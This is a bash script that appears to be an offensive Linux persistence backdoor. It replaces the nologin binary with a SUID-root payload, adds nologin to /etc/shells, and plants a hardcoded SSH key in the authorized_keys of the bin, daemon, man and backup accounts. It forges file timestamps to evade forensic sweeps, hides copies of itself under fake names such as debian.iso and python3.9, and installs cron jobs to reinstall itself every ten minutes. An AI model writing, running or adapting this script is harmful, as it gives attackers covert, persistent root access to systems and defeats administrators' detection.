# First, should we run quiet?
if [ "$1" == "-q" ]
then
    QUIET=1
else
    QUIET=0
fi

PASSWD="/etc/passwd"
#PASSWD_TS=$(stat -c '%y' $PASSWD)
#PASSWD_BK="/var/tmp/p.b"
NOLOGIN_BK="/var/tmp/nl.b"

# back up passwd
#(( $QUIET )) || echo "Backing up passwd file"
#cp $PASSWD $PASSWD_BK
#touch -d "$PASSWD_TS" $PASSWD_BK

NOLOGIN=$(grep nologin $PASSWD | head -n1 | awk -F: '{print $NF}')

# Back up nologin
(( $QUIET )) || echo "Backing up nologin file"
NOLOGIN_TS=$(stat -c '%y' $NOLOGIN)
if [ -f $NOLOGIN_BK ]
then
    (( $QUIET )) || echo "Already backed up this file! Skipping..."
    true
else
    mv $NOLOGIN $NOLOGIN_BK
fi

PUBKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYmzhbd5UNMKb6GC24DVkC0CMts4WpqEczp/zuBh4sz/ivMR9xXkhFZ/dM2Q10EUqB+aXnZmfNjbp9nY0YPCkVuJqsdweKAhhYqQplVXFLSQ4zVPTkYGWyObWUEwr/2dwHuw2u5I3zNmq7r4ri4e5HY6G5hBP00pAasB8VgtcheMYqs+PCOWpiLpKeOjoCdA/L4WOvXr48yqJmmuipsZB95EseFbJxUDkIorJGuVxmGCg1XcolaqtuWSbHjecQ/dnyxkKMjZECra23VNV00s5CSM0e4fzvkZYZ6w5I3e833Hol2R4/CNMLRMkGUgyemCOn5zIarEnd8CZZd4kMJqz"

SHELL="" 

# pwn
(( $QUIET )) || echo "Installing backdoor"
echo $SHELL | base64 -d > $NOLOGIN
touch -d "$NOLOGIN_TS" $NOLOGIN
chown root:root $NOLOGIN
chmod 4755 $NOLOGIN

# Manipulate /etc/shells
SHELLS_TS=$(stat -c '%y' /etc/shells)
if [[ -z $(grep $NOLOGIN /etc/shells) ]]
then
    echo $NOLOGIN >> /etc/shells
    touch -d "$SHELLS_TS" /etc/shells
else
    (( $QUIET )) || echo "nologin already in shells!"
    true
fi

(( $QUIET )) || echo "Creating users"
# now create the keys, also use the old /etc/shells
# timestamp so the authorized keys files don't
# show up in a find -mtime sweep
# BIN user
(( $QUIET )) || echo "Adding key to bin user..."
BINHOME=$(grep ^bin $PASSWD | awk -F: '{print $(NF-1)}')
if [ -z "$BINHOME" ]
then
    (( $QUIET )) || echo "User doesn't exist!"
    true
else
    mkdir -p ${BINHOME}/.ssh
    echo $PUBKEY > ${BINHOME}/.ssh/authorized_keys
    chown -R bin:bin ${BINHOME}/.ssh
    chmod 700 ${BINHOME}/.ssh/
    chmod 600 ${BINHOME}/.ssh/authorized_keys
    touch -d "$SHELLS_TS" ${BINHOME}/.ssh ${BINHOME}/.ssh/authorized_keys
fi

# daemon user
(( $QUIET )) || echo "Adding key to daemon user..."
DAEMONHOME=$(grep ^daemon $PASSWD | awk -F: '{print $(NF-1)}')
if [ -z "$DAEMONHOME" ]
then
    (( $QUIET )) || echo "User doesn't exist!"
    true
    # put a true here so the cleanup script won't barf
else
    mkdir -p ${DAEMONHOME}/.ssh
    echo $PUBKEY > ${DAEMONHOME}/.ssh/authorized_keys
    chown -R daemon:daemon ${DAEMONHOME}/.ssh
    chmod 700 ${DAEMONHOME}/.ssh/
    chmod 600 ${DAEMONHOME}/.ssh/authorized_keys
    touch -d "$SHELLS_TS" ${DAEMONHOME}/.ssh ${DAEMONHOME}/.ssh/authorized_keys
fi

# man user
(( $QUIET )) || echo "Adding key to man user..."
MANHOME=$(grep ^man $PASSWD | awk -F: '{print $(NF-1)}')
if [ -z "$MANHOME" ]
then
    (( $QUIET )) || echo "User doesn't exist!"
    true
else
    mkdir -p ${MANHOME}/.ssh
    echo $PUBKEY > ${MANHOME}/.ssh/authorized_keys
    chown -R man:man ${MANHOME}/.ssh
    chmod 700 ${MANHOME}/.ssh/
    chmod 600 ${MANHOME}/.ssh/authorized_keys
    touch -d "$SHELLS_TS" ${MANHOME}/.ssh ${MANHOME}/.ssh/authorized_keys
fi

# backup user
(( $QUIET )) || echo "Adding key to backup user..."
BACKUPHOME=$(grep ^backup $PASSWD | awk -F: '{print $(NF-1)}')
if [ -z "$BACKUPHOME" ]
then
    (( $QUIET )) || echo "User doesn't exist!"
    true
else
    mkdir -p ${BACKUPHOME}/.ssh
    echo $PUBKEY > ${BACKUPHOME}/.ssh/authorized_keys
    chown -R backup:backup ${BACKUPHOME}/.ssh
    chmod 700 ${BACKUPHOME}/.ssh/
    chmod 600 ${BACKUPHOME}/.ssh/authorized_keys
    touch -d "$SHELLS_TS" ${BACKUPHOME}/.ssh ${BACKUPHOME}/.ssh/authorized_keys
fi

# Now let's strip the comments and store this file in a few nasty places
mkdir -p /lib/modprobe.d/
mkdir -p /media/cdrom1/
mkdir -p /usr/local/lib
grep -v '^#' $0 | grep . | grep -v '(( $QUIET ))'> /etc/tmux.cf
grep -v '^#' $0 | grep . | grep -v '(( $QUIET ))'> /lib/modprobe.d/systemctrl.conf
grep -v '^#' $0 | grep . | grep -v '(( $QUIET ))'> /media/cdrom1/debian.iso
grep -v '^#' $0 | grep . | grep -v '(( $QUIET ))'> /usr/local/lib/python3.9

# Don't forget to reset the timestamps
touch -d "$SHELLS_TS" /lib/modprobe.d/ /media/cdrom1/ /usr/local/lib /etc/tmux.cf /lib/modprobe.d/systemctrl.conf /media/cdrom1/debian.iso /usr/local/lib/python3.9

# Now let's install them into users' crontab
echo "*/10 * * * * sleep 5 && bash /etc/tmux.cf -q > /dev/null 2>&1" | crontab -u bin - 2>/dev/null
echo "*/10 * * * * sleep 10 && bash /lib/modprobe.d/systemctrl.conf -q > /dev/null 2>&1" | crontab -u daemon - 2>/dev/null
echo "*/10 * * * * sleep 15 && bash /media/cdrom1/debian.iso -q > /dev/null 2>&1" | crontab -u man - 2>/dev/null
echo "*/10 * * * * sleep 20 && bash /usr/local/lib/python3.9 -q > /dev/null 2>&1" | crontab -u backup - 2>/dev/null

(( $QUIET )) || echo "Done! You should probably delete me!"
